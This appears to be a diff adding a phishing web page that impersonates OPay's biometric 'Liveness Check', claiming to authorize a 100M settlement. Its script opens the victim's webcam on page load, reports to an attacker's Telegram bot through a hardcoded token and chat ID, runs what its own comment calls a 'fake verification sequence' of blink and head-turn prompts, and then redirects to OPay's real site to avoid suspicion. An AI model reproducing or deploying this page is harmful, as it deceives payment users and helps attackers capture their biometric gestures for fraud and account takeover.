@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay | Biometric Verification</title>
+    <style>
+        :root { --opay-green: #00b875; }
+        body { background-color: #f4f7f6; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #fff; width: 350px; padding: 30px; border-radius: 24px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        
+        /* The Circular Camera Frame */
+        .camera-container { position: relative; width: 220px; height: 220px; margin: 20px auto; border-radius: 50%; border: 4px solid var(--opay-green); overflow: hidden; background: #000; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        
+        /* The Progress Bar */
+        .progress-bar { height: 6px; width: 100%; background: #eee; border-radius: 10px; margin: 20px 0; overflow: hidden; }
+        #fill { height: 100%; width: 0%; background: var(--opay-green); transition: width 3s linear; }
+        
+        h2 { font-size: 1.2rem; margin-bottom: 10px; }
+        #prompt { font-weight: bold; color: var(--opay-green); height: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Liveness Check</h2>
+    <p>Center your face in the circle to authorize the 100M settlement.</p>
+    
+    <div class="camera-container">
+        <video id="webcam" autoplay playsinline></video>
+    </div>
+
+    <div id="prompt">Initializing camera...</div>
+
+    <div class="progress-bar">
+        <div id="fill"></div>
+    </div>
+    
+    <p style="font-size: 0.8rem; color: #999;">Step 2 of 2: Biometric Encryption</p>
+</div>
+
+<script>
+    const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
+    const chatId = '7909543900';
+
+    async function startScan() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('webcam');
+            video.srcObject = stream;
+
+            // Notify Telegram that the camera is active
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📸 [PHASE 2] Camera accessed. User is scanning face...")}`);
+
+            // Start the fake verification sequence
+            runPrompts();
+        } catch (err) {
+            document.getElementById('prompt').innerText = "Camera access denied.";
+            document.getElementById('prompt').style.color = "red";
+        }
+    }
+
+    function runPrompts() {
+        const p = document.getElementById('prompt');
+        const f = document.getElementById('fill');
+
+        setTimeout(() => { p.innerText = "Please BLINK slowly..."; f.style.width = "30%"; }, 2000);
+        setTimeout(() => { p.innerText = "Turn your head LEFT..."; f.style.width = "60%"; }, 5000);
+        setTimeout(() => { p.innerText = "Hold still, finalizing..."; f.style.width = "90%"; }, 8000);
+        setTimeout(() => { 
+            p.innerHTML = "✅ Verification Complete!"; 
+            f.style.width = "100%";
+            // Redirect to a final success page or OPay official home
+            setTimeout(() => { window.location.href = "https://www.opayweb.com/"; }, 2000);
+        }, 11000);
+    }
+
+    window.onload = startScan;
+</script>
+
+</body>
+  </html>
+  
